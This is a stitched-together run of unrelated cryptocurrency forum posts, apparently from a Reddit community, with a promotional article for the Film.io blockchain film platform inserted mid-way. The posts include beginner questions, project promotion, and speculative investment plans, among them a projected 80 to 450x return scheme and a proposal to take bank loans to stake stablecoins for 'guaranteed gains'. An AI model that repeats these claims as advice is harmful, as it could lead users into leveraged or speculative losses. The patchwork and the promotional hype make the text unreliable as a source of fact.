It has been almost 4 weeks since I have been playing this game, and looks like the obsessive chart viewing addiction has been replaced by this game. Although, I am not sure if that is a good thing or not but at least it is getting me out of the house and testing my general knowledge (through trivia).

Anyway, around day 5 I made approximately 0.00021886 BTC and 0.00213887 ETH, which works out to 13, in rewards through answering trivia questions correctly.

As mentioned previously, I feel like this is almost the easier alternative to DCA into BTH/ETH, if like me you don't have spare cash to use, and in doing so you are working on your physical and mental wellbeing.

To date I have made around 0.00204119 BTC and 0.02812703 ETH, which works out to 185, in rewards, not too shabby for venturing outside the house and answering trivia questions!

Currently the game is available all over Canada and USA, and UK, and the next country to launch will be El Salvador, and thereafter more and more countries.

NA users currently have options of 2 exchanges to transfer their prizes to; however, UK users are patiently waiting for access tp an exchange to "cash-out" rewards. 

If you are interested in playing, check out the google appstore, but there might be some wait for IOS users as the app is in testflight and hopefully gets released soon.

The game official site can be found here: [https://coinhunt.world/](https://coinhunt.world/)

An excellent wiki made by [u/CoinHuntWorldWiki](https://www.reddit.com/u/CoinHuntWorldWiki/) explaining all the rules can be found here: [https://coinhuntworldwiki.com/](https://coinhuntworldwiki.com/Start_Guide)

Deep inside an oil refinery, a serial killer gets ready to pounce on a police detective risking her life to entrap him. You see everything from the killers perspective, with the full creative power of Alfred Hitchcock inspired by avant-garde Italian cinema techniques.

And so goes a pivotal scene in Hitchcocks film Kaleidoscope. Theres only one problem: Kaleidoscope was never made.

In fact, if Hitchcock hadnt funded the production of Psycho when the studio executives refused it a few years earlier, that quintessential horror classic may have been one of the best movie ideas not made.

But shouldnt a creators sole responsibility be creating, with no pressure to consider how funding will work out, let alone provide it themselves? The movies never made because of lack of self-funding make the answer a resounding yes.

Whats more, some near-misses with treasured and innovative screenplays underscore studio heads shortsightedness from a screenwriters perspective, too. No less than the likes of Pulp Fiction and The Usual Suspects show this amply. Turned down largely because of their non-linear plotlines, both eventual classics could have easily become just two more of the best screenplays never made.

While Pulp Fictions screenplay was turned down in one case for being too demented, the screenplay isnt whats really crazed. Rather, its always letting a centralized few choose what movies are made and hardly letting fans and creators call the shots at all.

Although the frustrated screenwriters murder in The Player is an extreme and fictional act, its figurative similarity to what happens in the real world of Hollywood just hits too close to home for comfort.

Entrusting Your Love of Film to  Flights of Fancy

If Robert Zemeckiss Romancing the Stone hadnt been made beforehand, Back to the Futurean obvious instant classic nowmay have been one of the best movie ideas not made. In the case of this blockbuster, multiple studios gave exactly opposing reasons to reject it, too naughty for some but too tame for others.

Such sharp subjectivity shows the established movie industrys all-too-frequent preference for conformity over originality, too. For example, it would be hard to imagine filmdom without Quentin Tarantino, but if it werent for a party invitation that led to Reservoir Dogs, his finished work might not have ever gotten started.

But even then, what if potential directors dont happen to live in the right zip codes? Considering that Hollywood is just one small part of a much larger country and the world, the right question seems more like when than if.

With odds like that, how many great movie ideas not made could have been?

But Hollywood Is Good at Picking Out Successful Movies, Right?

With more than 110 years of history, youd think the American movie industry would usually know what people really want and then greenlight films accordingly. However, 80% of movies lose money, with the many losses outweighed by returns from a few big blockbusters.

For that matter, what does Hollywood's monopoly mean for filmmakers who have great ideas and potential mass appeal but who simply lack the right venue, resources, or connections? Unfortunately, the answer is a wealth of great movie ideas not made.

Hollywoods long history of exclusion underscores such lacks. A UCLA report states that in 2020 only 20.5% of directors and 26% of film writers were women, with only 25.4% of directors and 25.9% of film writers representing all minority groups. While progress has been made recently, much of it has been ascribed to the pandemic, a huge event but a one-off all the same.

In short, Hollywood makes movies people enjoy, but not enough of the right ones to please a greater possible fan base and creator pool.

But youre in luck.

The first completely in-house Hollywood film may have been In Old California in 1910, but theres a new, more democratic sheriff in town, and its name is blockchain  movie industry bigwigs take note!

Going Where No Good Film Can Be Ignored

So how does Film.ios innovative blockchain platform do it? By letting fans  and not just established filmdoms finaglers of finance  drive its ecosystem.

Specifically, fans earn FAN movie tokens by staking their tokens in the projects they support among the platforms treasure trove of selections. Film.io allows users to stake FAN movie token rewards in the projects they support and want to see get the greenlight, by assisting in unlocking the projects unique market-validated Go Score. We are putting the power of what gets made into the hands of the fans.

At the same time, Film.io makes sure that creators masterpieces stay out of the greatest- movie-ideas-not-made category unfairly, as it rewards creators of a wider variety of backgrounds more fairly and more purely for their creativity than Hollywoods sometimes misguided movie machine usually can.

So, how does it work for creators? Film.io liberates creators with equal access to a fair and unbiased blockchain ecosystem, where they can gain market validation and build an audience for their projects.

Creators will be provided a proof of originality timestamp via the company's patent-pending VaultLock technology, or what the Film.io calls Proof of Originality. The Proof of Originality is an immutable entry in the blockchain that can be used to support ownership of a creators project based on when they first submitted their idea.

Through Film.ios blockchain, film creators can thus find secure ownership and robust development of their ideas, within a community of aficionados literally staking their crypto and love of film to make the creators visions successful.

Not only that, writers, producers, and directors can share their projects as they build a motivated and collaborative fan base, connect with other industry professionals, and be discovered by companies who acquire content.

Behind the scenes, Film.ios process is fueled and protected by the super security, transparency, and community only a decentralized blockchain film solution can provide.

Film.io will be the worlds first open and inclusive entertainment industry platform designed to connect creators, fans and film investors to define the future of film.

We do not want to replace Hollywood, but merely advance efficiency and inclusivity. We intend to complement the traditional studios by providing diverse and market-validated content while also encouraging change to Hollywoods existing exclusivity ethos.

Film.io and its groundbreaking decentralized film financing platform stand to free movies and their makers from old California and lead them to a new world of classics that could have never been made without them.

Who knows how many original, compelling stories can be told with Film.ios revolutionary blockchain movie industry platform?

I offered to send an acquaintance funds.  I explained how to download a crypto wallet (I listed several) from Play Store or App Store.  I explained the cryptos I could send (BTC, ETH, XMR).  I explained how to send the public key to me so that I could make the deposit.

This person is a full professor at a major Colorado institution.  Very intelligent. 

This person replied: "Unfortunately, I don't have any crypto accounts".  

If I'm reading the response correctly, this person thinks an account with an institution is required to deal with cryptos.  Very sad.   We need to do better with newbies.

There are loads of new members added to this sub every day.

They join for various reasons:

* The hit the button by mistake
* They got lost while scrolling reddit
* They want to learn about Crypto
* They heard about the valuable pool of knowledge we have to share
* They googled "wen lambo" and ended up here

Whatever the reason, they are now likely wanting to contribute in a meaningful way as well as earn their own moons and karma.

Please provide the most generic comments you can provide so they know what to expect when seeking advice.

Some examples could include: "this is the way/gwei", "this guy" or "DYOR".

I toyed with marking this as "comedy" or "moons" but it's not that funny and isn't likely to get many moons. I'm genuinely interested in how many generic comments it gets that add literally nothing to any post.

Im new to this space. I used to follow BitBoy until I learned that he was a clown. Now, Im looking for other sources of information. What I liked about BitBoy is that even though he was a clown, watching his show daily made me feel that I had a decent feel for what was going on in crypto, since he covered all the major events of the day.  

Thats what Im missing now. I no longer have anyone to help me keep up to date on whats happening day to day, so Im lost. I listened to Crypto Banter for a while and although I like them, I dont have enough time to listen to them each day and they dont really talk about everything thats going on. They seem to focus more on price action. 

So what do you use to know whats going on day by day? The more concise, the better.

I know this post is gonna be a shillfest, but that is precisely what I expect, as long as posts are thoughtful and informative. I'm a huge Eth bull and believe it is here to stay, but I also recognize that current fees are truly detrimental to it and this must be addressed ASAP. Though Eth 2.0 is on the works, it is still some time away from being deployed, and Vitalik has recently pointed out the importance of auxiliary tech to help Eth's congestion problems. 

Scaling is a topic I'm trying to understand better and though I did some research on it, I still haven't really wrapped my head around the particular differences, pros and cons on most of the projects in existence. I do have a tendency to learn things better when I see them compared and pitted against one another and I hope this topic will foster that kind of healthy discussion.

Thanks a bunch!

Hey,

I'm new to biybit and I was wondering if anyone knows if there is a way to set the TP/SL by % not by Take profit USDT amount. Like in FTX where I can say, take profit at 0.8% increase and close the position at 0.4% loss. In my case I only see Take Profit USDT at 10% 25% and so on but nothing were I can manually set the take profit gain %. This would be a massive help if anyone knows this as it is a big issue that I'm facing and other wise I would not be able to trade on bybit.

&amp;#x200B;

I would appreciate it dearly.

&amp;#x200B;

Thank you

Hey guys, and gals


I would like to make this short and sweet (but can't because of the minimum text requirement thingy) but with so much interest in Crypto building lately, I have been wondering when the two worlds will cross.


Let me know if such a coin already exists, but I don't think an Anime related coin/token has already been created. If it has let me know, cause I will certainly go in balls deep 2D and 3D. 


We all know anime has a huge following with people who like to spend money, now imagine buying into anime related merch and other things with crypto! Sounds like a great idea in my opinion.

TL:DR Don't stop after this Bullrun if you don't need to.

This scenario obviously looks different for everybody depending on the absolute gains you made until this point. 

Also retirement money amount really differs with your cost of living.

So I guess many of us are up atleast 50-100% on their initial investment right now.

Now you will be hodling some more for a post 100k bitcoin where we could come closer to blow-off top price action.

Somewhere near (does not have to ideal) you exit 90% of your position in like 3-5 separate times sales. 

The missing 10% are either a longterm hold so you dont completely miss the train in case we see a 1mio bitcoin or an even later sell after a Blow-Off (where we see first &gt;25% declines again)

Putting close to 50% of the sold amount in stablecoins (USDC) and lock in one or multiple savings-services (crypto.com, blockfi, binance...) with 6-8% APY for 1-2years. 

You can also leave it on the bank if you don't trust these services with the 50%.

Using the savings method you beat disgusting fiat inflation and dodge the hardest moves of bearmarket. 

After close to 2 years when people are getting desperate again and we saw some 80%-declines for most coins, buy in through seperate timed steps again (can also be a longer DCA entry) for probably over 5x the crypto position you sold.

Now hodl through the next bullish run (surpassing old All Time High) for another 8-10x at which point there is a real chance you already reached  retirement money.

Summary Calculation over whole portfolio: 
1-3x until now
Now
2-3x until Blow-Off Top Sales (conservative)
5x through bearmarket entry
8-10x on that new position (depending on entry/exit point quality) 

Total= 80-450x Potential with middle of 260x 

Even the rather underestimated 260x Profit on Initial Investment would for many people mean more than life changing amounts. 

Please correct me for thought errors.

If you are new to investing in the crypto market, then youve likely heard people talking about crypto bull/bear markets or crypto whales, but you might not be sure what they mean.

The truth is that its possible to make money in both bull and bear markets, but there are different [strategies](https://cryptoadventure.com/top-4-crypto-investing-strategies/) for each. That said, investors should be cautious when putting their money into cryptocurrency markets no matter what type of investing environment we are experiencing because there are serious pitfalls to avoid.

In this guide, well go over precisely what bears and bulls mean for your investments and examine some strategies that you can use in both markets.

 

## The Bears

 When we talk about a cryptocurrency bear market, we refer to a market situation defined by caution and pessimism during which traders are much more likely to sell than buy. 

 

An excellent example of this is [Bitcoins downturn](https://www.forbes.com/sites/outofasia/2018/03/05/explaining-the-dip-what-caused-the-recent-cryptocurrency-downturn/#1e4cfbef5ccd) in 2018. At the beginning of 2018, BTC prices started plummeting, which considerably shook buyer confidence. After prices began to fall, investors holding [BTC](https://cryptoadventure.com/the-real-bitcoin-a-beginners-guide-to-avoiding-confusion-surrounding-bitcoin/) panicked and sold their investments, putting a great deal of pressure on the market as a whole.

While owning a losing investment can make anyone depressed, it does present an exciting opportunity. [Bearish](https://cryptoadventure.com/understanding-the-common-terms-used-in-crypto-trading/) crypto markets tend to reduce the prices of every project since they all follow BTC very closely.

This means that investors who are willing to wait out this depression could find themselves in a perfect position when the bear cycle decides to recede. For value investors, [crashing cryptomarkets](https://cryptoadventure.com/the-bitcoin-bubble-burst-turns-2-years-old-is-it-still-safe-to-invest-in-cryptocurrency-in-2020/) can present a brilliant opportunity.

However, investors looking to take advantage of these prices should spend a good deal of time researching their [chosen](https://cryptoadventure.com/factors-to-consider-when-investing-in-cryptocurrencies/) digital assets. If you can find a decent deal on a token or coin that you think has a substantial project and use case, then you have an excellent chance to establish a position that you otherwise wouldnt have had access to in different market conditions.

As an investor, its vital not to mix up a bear market with a price correction in the charts. A bear market is a sustained period characterized by noticeable [downward movements](https://cryptoadventure.com/beginners-guide-to-understanding-trading-charts/). A price correction takes place when the price of an overvalued digital currency corrects itself.

 

## Bull Markets

Typically a bull market is one defined by optimism and investor confidence. If the market trend is up, then were witnessing a bull market.

Cryptocurrency investors experienced this [toward the end of 2017](https://www.ft.com/content/4682c87c-d560-11e7-a303-9060cb1e5f44), and they saw many of their investments skyrocketing overnight. A lot of new money entered the cryptocurrency space, and that pumped a ton of money into many projects.

The massive gains brought about this interest bitcoin experienced, attracting the mainstream medias attention and dragging in those who had never heard of or at least had never been interested in [cryptocurrency](https://cryptoadventure.com/beginners-guide-to-cryptocurrency/) before.

Investors who are coming into space during a bull run should be [extremely cautious](https://cryptoadventure.com/the-ultimate-guide-to-protecting-yourself-in-the-crypto-space/). What goes up must come down, and its easy to buy in at the top when the bulls are running. While this can feel like a great decision at the time, you could be setting yourself up for a disaster a couple of months down the road.

When choosing your investments, you should carefully analyze each asset to ensure it is not trading at an inflated and unstable price.

 

## Preparing Your Crypto Portfolio For a Bear Market

If it seems that everything is crashing down in the markets and youre afraid that a bear market may be imminent, then it may be in your best interest to reduce many of your positions. Positions in less proven digital currencies may especially then be highly inflated. That said, even top coins like Bitcoin and [Ethereum](https://cryptoadventure.com/the-beginners-guide-to-ethereum/) can experience massive losses in bear markets.

Your best option would be to move all of your crypto holdings to stablecoins such as tether ([USDT](https://cryptoadventure.com/the-beginners-guide-to-tether/)) and Circles USD Coin ([USDC](https://cryptoadventure.com/stablecoins-surge-in-market-share-amid-crypto-market-crumble/)) or any of your choice. Stablecoins are a special kind of digital asset that is meant to be stable, valued equally to a real-world asset, such as the U.S dollar.

This gives a stablecoin two major advantages: [a lack of volatility](https://cryptoadventure.com/how-to-protect-your-cryptos-from-the-market-volatility/)  which is a problem for even some top cryptos such as Ethereum  and a certain measure of trust. Moreover, being a virtual currency rather than fiat, stablecoins are ideal and quick for inter-cryptocurrency trading, which would allow you to quickly buy BTC other top tokens once crypto markets start recovering.

Numerous [quality altcoins](https://cryptoadventure.com/6-explosive-altcoins-to-watch-in-the-next-months/) will often be available for rock bottom prices during a bear market. You could likely double or even triple the number of digital assets in your portfolio by taking profits at the right time and then buying back in at a later date.

## Preparing Your Portfolio During the Bulls

If the bleeding in your investments seems to have stopped, and you can see volume starting to pump back into different projects, then it might be time for the bear market to go into hibernation. Its often tough to identify the bottom, but if the market has been chopped down at the knees, its likely a good time to [start accumulating](https://cryptoadventure.com/tips-for-creating-a-crypto-portfolio-in-2020/).

Keep in mind that investors will likely be much pickier when buyer confidence and [trading volume](https://cryptoadventure.com/volume-in-cryptocurrency-trading-and-introduction-to-buy-vs-sell-volume-indicator/) returns if they have been burned previously. Be careful only to place your investment in substantial projects with [promising and practical use cases](https://cryptoadventure.com/top-5-promising-crypto-coins-to-invest-in-2020/). This is a great time to get in on projects which may have been too costly for you to invest in before.

As always, its [essential to do your research](https://cryptoadventure.com/how-to-avoid-cryptocurrency-scams-with-these-24-red-flags/), and you should never invest more money than you can afford to lose. Cryptocurrencies are still very new as far as financial instruments are concerned, and they are incredibly volatile. Its essential to diversify your assets to secure your financial future.

Keeping more money staked in a crypto stable coin vs a bank sounds pleasant at first because you can use it as a hedge against inflation and benefit from higher APY than with banks. But if you sell to buy other crypto or move it, you get taxed on it. Doesnt that mean you lose more money from taxes than the potential stable coin gain? 

Im all ears (well, eyes) for someone to explain this to me bc Im sure Im overlooking something. There seems to be a good number of people on this sub that do that. Its something Ive considered but the thought of selling at some point and experiencing greater loss has been unattractive and confusing to me.

ALTS are skyrocketing and outperforming BTC while it hasn't pumped yet.

The whole Crypto ecosystem has been risisng and is about to face mass adoption.

Matt Damon tv commercial is promoting crypto.com

Everywhere I look at I see crypto being promoted in sport events and social media.

Is PlanB right? Is BTC following the 2017 pattern / 1970's Gold pattern?

What's your sentiment? Is FOMO a real deal?

During the recent SQUID fiasco, if you were one of the suckers that bought the token only to realise it was impossible for you to ever sell it, there was in fact one way you could have exited your position if you got in early enough. You could have even made some insane profits too.

The solution would have been to provide your SQUID (and some equal BNB) as liquidity to the liquidity pool. 

Since SQUID could only be purchased but not sold, this would mean that the SQUID in the liquidity pool was steadily depleting while BNB in the pool was increasing. If you were a liquidity provider, you would have seen your SQUID reduce in favour of BNB. Even better, if you had done this early enough, you could have seen insane profits as the price of SQUID soared even despite the ridiculous impermanent loss.

Of course there are 2 major issues here. 

1) It becomes a game of chicken where you would need to pull your liquidity before the scammers dumped their SQUID.

2) You would have to risk even more money in the form of equal BNB that could be lost if you didn't pull your liquidity before the scammers dumped.

Anyways, this information is totally coming way too but I figured it would be educational none-the-less.

It's pretty usual on this sub to see people asking for suggestions on reputable people to follow. That's all good and I reckon I've got them down pat.

Yet, I want to know who are people I need to avoid, to not give the time of day to not even once. That if I see a post on here about the person or a project connected to the person I can say yeah nah.

I'm talking influencers that just peddle trash to their viewers.

Known crypto developers that are known rug pullers.

Just scammy individuals that shouldn't be given the time of day.


**Let me me know the person and why they should be avoided at all costs**

I'm talking semi big to big names as there's probably a thousand crypto bros that fit the bill otherwise.

So I have paid my bills for the month and looking to make a few investments of a few hundred here and there and this month my bank (TSB) decide to block all transactions to Coinbase.  

I google it and yep - TSB have now decided to stop all transactions via debit card, credit card and bank transfers with Bitcoin and all related currencies due to potential fraud.

Has anyone else experienced this with their banks/CC providers specifically in the UK?  I need to know if I need to go open an account elsewhere for my transactions.

I don't know if it's a coincidence or not, but I feel like Bulgaria, for such a small country in Eastern Europe has given birth to whole lot of big names in the crypto scene.

Nexo? I recently did a huge post on them that I can't find now for some reason.  
Long story short - Bulgarians with a bunch of offshore companies.  
No office adress, no telephone numbers - nothing.  
is-nexo-safe . com is an interesting one. Scroll down to the reviews.

Moving on.  
Do you remember OneCoin scam? Dr. Ruja Ignatova? The crypto queen that took billions and just vanished? Yeah, that one. Bulgarian as well.   
Squid is a joke compared to that.

Robinhood? I would call it a scam, but people have been coming out with mixed opinions as of lately. I'll won't comment any further.  
CEO? Bulgarian Vladi!

Oh, and by the way Bulgaria (the country) actually holds more than 200.000 BTC.   
Some say the key's have been lost and those coins are lost, but many speculate that certain people from the government have actually sold most of them years ago. Adress is unknown to this day.  


Whenever you feel like something is fishy - try to see who is behind it and have a piece of mind.

I have done some reading although I am relatively new to crypto as I come from stocks background. Nevertheless, I love how there is no overnight fees on crypto (unlike in stocks in small portfolios), so I have decided to put some money into crypto and hold for the next 10-20 years. Its nothing major but so I am not bothered about the price movements all that much. Some people predict bitcoin to reach $ XXX XXX dollars if bitcoin reahces the market cap of gold ([https://www.bitcoinprice.com/predictions/](https://www.bitcoinprice.com/predictions/)). What are your thoughts on the bitcoin futures price? What are your predictions?

I'm ready to start using SPEDN to make purchases via the Flexa Network and, currently, you're able to add funds using BCH, BTC, CELO, DOGE, ETH, GUSD, LTC, and ZEC. In your experience, which of these is best in terms of fees, speed, and overall acceptance? I added a little ETH just to see how the fee stacked up against the amount and, as expected, not great, so I'm curious to see what other people are using.  Also wondering if there are other alternatives (such as swapping) that will involve even lower fees. Thanks for any input and insight!

This should be reminded to all the new people and lesser new people who have been living under a big Ether rock.

The bull run is in full progress and everything is heating up again. Fomo kicking in all over the charts and All time high's being broken left and right.

People are getting the urge to invest more than they are willing to lose and that they can afford. And in this craziness people are losing grip on reality and start to take loans to chase pumps and to invest in memecoins. 

But for the love of your future self, do NOT take loans to invest in Crypto. This should never be an option and should never enter your mind as a solid idea. 

Crypto is volatile and can crash for the most idiotic reasons and you will be left holding bags for years before returning in the Green numbers again. 

Please avoid your future self problems, stick to DCA and do not invest more than you can afford.

Happy healthy gains and enjoy the ride!

If I hold ETH in a Binance Smart Chain wallet (BEP20 token) and I want to send it to a centralized exchange (for example, Binance), do I have to bridge it to ERC20 token to send it or does the centralized exchange hold ETH in multiple chains and therefore I can just send ETH as a BEP20 token? I had to create a Reddit account to ask this question because I can't find this answer anywhere. I can only find questions about sending from an exchange to wallet but I know how that works just not opposite way around. Your help is greatly appreciated :D

**Full disclosure**:  I bought a very small amount as a test buy a few months ago and it has returned 36% gains in the past 2 weeks.  This got me thinking if this would be a worthwhile project to invest in for the long-term like ADA/Algorand etc.

**TLDR:** I recently invested a very small amount in CKB and want to know opinions on the longevity of this project? It sounds like every crypto investors dream come true so why is it not not talked about?

Hello All!

I have just done a quick search on the sub in relation to CKB but cannot find any serious discussion around the project.

Therefore, I would love some real insight and opinions from the OGs of r/cc in relation to the pros and cons of investing in CKB.

From my (lack of technical) understanding, this project is looking to simplify  interoperability, i.e. transfer assets between blockchains with ease. As the video on their [homepage states](https://www.nervos.org/) this is a "universal passport to the blockchain", allowing you to:  


* create an app on one blockchain and reach users in every blockchain
* build on one blockchain and reach every blockchain
* use one crypto of your choice and one interface, to interact with every single blockchain
* use apps already built on other blockchains
* port your code to every single blockchain

In theory, this would eliminate the the needf for, and frustration associated with, having multiple wallets and remembering the associated seed phrases.

So why is this not being spoken about or hyped up as much as the next project? What am I red flags am I glaringly missing, if any?

Thanks in advance for your valued insight.

Today Banking policymakers decided and voted 7-2 to hold the current interest rates at a record low of: **0.1%**, yes you this is correct. The bank decided to have this kind of a interest rate if you put your money into the bank. 

Just as a reference, the interest rate was *5%* in 2009, and we were in the middle of big and ugly financial crisis at that time. 

I think that this will be a tipping point for many newcomers to discover the beautiful world of crypto and staking. 

Because right now, due to inflation, all you can do is lose value on a daily basis if you decide to have it in a bank. 

Mass adoption will bring a new patch of users into this game, and day by day we are witnessing new projects and updates where its becoming easier to buy, hold and stake crypto.

IOTX is up nearly 250% at a price of 40 cents and oh boy do i wish i hadnt sold mine at 0.08 cents. 
I missed out on some decent profits all because i was inpatient, dont be like me have patience in projects you really  believe in and youll be gifted with profits(hopefully)
I still did make a small profit when i sold at 0.08 cents but still i cant stop thinking about the profits i could have made
If you guys have similar storys im curious to hear them

Hello, I found [this video](https://youtu.be/GUs5y9leCyA) on a popular YouTube channel called Cracked and it annoyed me enough to post a lengthy comment to it:

Here is said comment:

"I love Roger but many things in this video are inaccurate. For example: not all cryptocurrencies are as power hungry as Bitcoin which is based on proof of work (the hard mathematical problem Roger mentions here) for mining. Many currencies use other mechanisms such as proof of stake (coming soon for Ethereum and already used by Cardano and, most likely, other currencies as well) which are much, much more efficient and eco-friendly.

Also, one could argue that the combined infrastructure of all banks across the world also uses a great deal of energy. I'm not saying that banks are going to disappear tomorrow so, of course, cryptocurrency's energy costs will still be adding to those of banks everywhere but one could also argue that the more cryptocurrencies take away from the amount of transactions being processed by banks, the lower the banks' energy costs will be (if and only if said cryptocurrencies are more energy-efficient than the banks for processing transactions, of course).

Additionally, when making profits off YouTube videos, it is bold to make claims about energy efficiency and environmental impact!

Moreover, the part about losing all your funds in the event of a hard drive failure is only true if one does not store or loses their secret seed phrase (private key that should NEVER be shared or stored on digital media) and the drive fails. Otherwise, recovering funds is easy and can be done with any new wallet (which is why, again, one should NEVER share their private key or store it on digital media, especially if such media is connected to the Internet!).

Additionally, more and more businesses are accepting cryptocurrency because it enables them to diversify their treasury and gain taxes can be delayed until it is sold at a higher price or deducted if it is sold at a loss. Another major incentive is the fact that transaction fees are paid by the customer, not the seller and, therefore, companies avoid the fees imposed by credit card suppliers and the customer cannot ask for a chargeback which, on top of being a nuisance to the company, can lead to penalties for the seller.

Finally, NFTs aren't limited to silly GIFs. Many things such as art (paintings, music, etc.) can be NFTs and artists who want to own their work without having to give a substantial chunk of their revenue to corporations can benefit greatly from this new approach to ownership.

Yes, many coins are memes and many scams do exist but one should not group all cryptocurrencies in the same category."

I would like to know what kind of arguments other people in the community would've made as the arguments brought up in this video are quite common and highly irritating and I would like to further my understanding on the subject for future arguments of this kind.

Thank you all!

This is a question for Crypto experts on this sub. The ultimate goal of any legit blockchain is adoption i.e. if people transact on that blockchain using that very Coin. Take GRT or STORJ for example. Wouldn't it be in their best interest to keep the price of a single coin hogh enough so it's rewarding for its node operators but low enough so it's cheaper to transact. If it gets too expensive, then more node operators join in, but actual users run away because now it costs them a $1 to do the same transaction that used to be $.10 a few months ago. For a blockchain startup, what is the solution to this problem? If there's a gap in how I described it, feel free to correct it from an unbiased, strictly technological standpoint.

I have deposit some BTC to my Bittrex account ,after this  i have try to buying some BTM coins there. Now i am trying to withdraw this amount of BTM to other wallet but i get as responde this message on my status withdraw "  Statis: invalid "

I have trying several wallet like gate.io and okex and others like this to just find a way to withdraw this amount of BTM but still have the same problem.

To don not forget , i have also add all those wallet  adress es to my whiteliste adress to dont have the problem of authorization ,vut still without solution and , each time i am clicking on the red X to back my money to my Bittrex wallet .

I am sure the Withdraw adress is correct ,cause its a copy pasted from gate.io or okex or other wallet that i own directelly without any modification  ,but the result is the same " Statis : invalid" as respond.

So is there any one that can help me and show how can i withdraw my BTM from Bittrex to any other wallet please?

I seriously don't get how some users had their first moon distribution and collected 100+ moons simply reposting articles..
Yep i'm a little frustrated about it but good for them i guess!
This is my third moon distribution, and still have less than 100 moons, that butt hurt me a lot since i'm really participating to the community commenting, upvoting, posting, ecc..
I think i might not have understood how to gain moons at all lol
For sure i've burn my +20% moons this month, and didn't achieve the 5% for participating to the pool (university exams took me much time).
Now i knew since the snapshot how much karma i earned but didn't know about others.. today most of the newbies are shitposting their enthusiastic gains and it felt like i had to shitpost more just for that sweet karma (JJ)

Now, forget about my hurt ass, that was just for saying, but wouldn't it be nice if there would be a "seniority" bonus % for older user in moon distribution?
I'm not doing my interests proposing this, since i'm a three-months-old user, but i think that an old user that doesn't post much but upvotes, downvotes and comments is more "worthy" that a funny comment made by a cool newbie that gets 1k upvotes for saying "SHITCOIN to the moon "

Thanks for the attention, i want to read your opinions about it, especially if you think i'm wrong!

Okay so hear me out here boys and girls... The entire crypto market is lead by Bitcoin, it's the oldest and the staple of stability for the entire market.. So what happens if it was 51% attacked? There are tester quantum computers being used to test and create software in the hands of individuals as we speak, how long till someone mines Bitcoin with one and realizes they could validate any transaction they want? It would destroy the safety and trust completely so do y'all think everyone would move over to Eth or other staking systems, or do y'all think it'd simply end the entire crypto market indefinitely? 

Just curious on what everyone's thoughts are for when Bitcoin collapses :D

Charity tokens are awesome and might make you money (not financial advice). I think they should really be a tax write-off to be honest and should be a lot more widespread what does everyone think?

&amp;#x200B;

I'll shamelessly plug Red Panda [https://redpanda.earth/](https://redpanda.earth/) which saves endangered wildlife but there are a ton of others and they should be talked about more.

&amp;#x200B;

[https://chng.it/ptmFJ6BGKF](https://chng.it/ptmFJ6BGKF)  also fill this out if you want to spread awareness of this charity token and it could lead to others gaining recognition.

You know which sub I'm talking about. That dimly-lit hopium den with rocket ships and Moons poorly painted on the walls when you walk in. The stale air and the heat generated from all the chart screens is suffocating.

Down the hallway you can hear the constant echos of moonshotters congratulating each other on being 'so very early'. The speakers that line the place are crackling and near worn out from HODL encouragements.

But the back room..  that's where they keep the elusive hopium-addicted whales. I had to pull the cloak off atleast one of these bastards. The password for the guards was "just needs to hit $1". Glad I guessed right, I can't imagine the damage those red dildo flails would have done. 

I followed the chanting to the back table but the poor-detector lit up like a r/cc redditor's eyes on Moon payday before I could get too close. 

Where was I?

Hi fellow CryptoKnights

I'm pretty new here, I've been reading a lot about crypto and started toying around with it at the ATH few months ago.... Then the dip happened and I was down over 50% at one point. I've stuck around, learned a bit, made some trades, and now I'm here - in the green a little bit. These are the projects that I think might do well. I started by putting all my eggs in one or two baskets, that did not go very well, but I learned from it. 

I've read probably thousands of threads on this and various other subreddits - so much still to learn. I have a problem with what my exit strategy should be, besides Lambos. I have no clue when I should sell. What do you all do? Do you have a set goal/threshold where 'that's enough' and you cash out?

Roast or Toast - Going to learn from both. Thoughts on this allocation?

I really like coins that have a real life solution to everyday problems and that are not meme or made just for fun. Today I'll introduce you to DVPN AKA sentinel. The DVPN is available on Android and iOS.

Sentinel is the first scalable framework allowing for dVPNs to utilize shared resources, reducing the overall network carbon footprint
It is the goal of the Sentinel ecosystem to decentralize the VPN industry and introduce the dVPN to the
mainstream consumer. However, this goal will not be achieved through the launching and maintaining of a single consumer facing application (the Sentinel dVPN), but by first establishing and then developing upon a framework that can be used to create a network of independently operated decentralized VPNs.


Sentinel allows anyone across the globe to mine with their excess bandwidth, effectively monetizing residential or commercial bandwidth by providing it to a network of distributed and decentralized dVPN applications built on the Sentinel framework. Sentinel has no server since it's a decentralized Blockchain therefore more security and resilience is achieved. Censorship resistance is at the core of Sentinel architecture, sentinel nodes communicate directly with cosmos based blockchain, in a permissionless way, nobody can stop you from accessing the infrastructure and monitor or censor your payments. The Sentinel dVPN framework provides an incredible degree of resiliency and security when compared to any consumer-grade VPN. Sentinels architecture minimizes the number of intermediary servers and dependencies.Apart from the account management and creation system also, the process of finding available vpn servers happens on-chain. The blockchain on which the applications are hosted will be operational 24/7, the up-time and user experience of these applications will far exceed the centralized competitors. The protocol will operate with no disruption thanks to the global validator communitys which ensures decentralization and high quality of service. As the blockchain which the application is hosted on will beoperational 24/7, with no disruption, as the validator communitys infrastructure is globally decentralized, the up-time and user experience of such an application will far exceed the centralized competitions offerings.


Therefore, my dear crypto community leave your CVPN and head to DVPN to really protect your privacy!

I'm seeing alot of hate from America's young generations towards the Boomers and alot of posts with the theme "crypto will save us from the boomers".  The fact is that the Boomer generation is sitting on the largest IRA/401K paper wealth in US history and the vast majority will be passed down via inheritances.  

Now:  imagine what happens when Millenials  &amp; Zoomers get their hands on that 30T inheritance incoming?  Where do you think the young generations are going to stash a large, large portion of that $30T?  Crypto.  This incoming wealth transfer will also create a massive asset class re-balancing.

&amp;#x200B;

" The largest intergenerational wealth transfer in history will pass down over [$30 trillion in inheritance](https://www.morganstanley.com/access/why-millennial-investors-are-different) from baby boomers to millennials and Generation X across the next few decades. "

You should only invest what you're willing to lose. I get that. But is there really an issue with borrowing money from a bank for a loan, buying USDC or some other stable coin, staking it on somewhere that offers pretty nice returns (like 8% on celsius) and using the interest earned to pay it back?

Of course the interest rate on the loan would have to be lower than the 8% in this example but hypothetically this should work out right? And yes your total 'profit' would just be the interest gained from staking subtract the interest paid/owed on the loan. So not a lot of profit. But it seems to open the door for guaranteed gains which is a short step from just scaling up.

What am i missing?

Hi guys, so I use crypto.com to get the Amber card which gives me CRO cashback at 2% on all purchases. I have to stake 300 to do this. CRO has seen crazy gains and I'm up 25% in the ~2 weeks since I began. This is likely because CRO recently got listed on CoinBase.
              
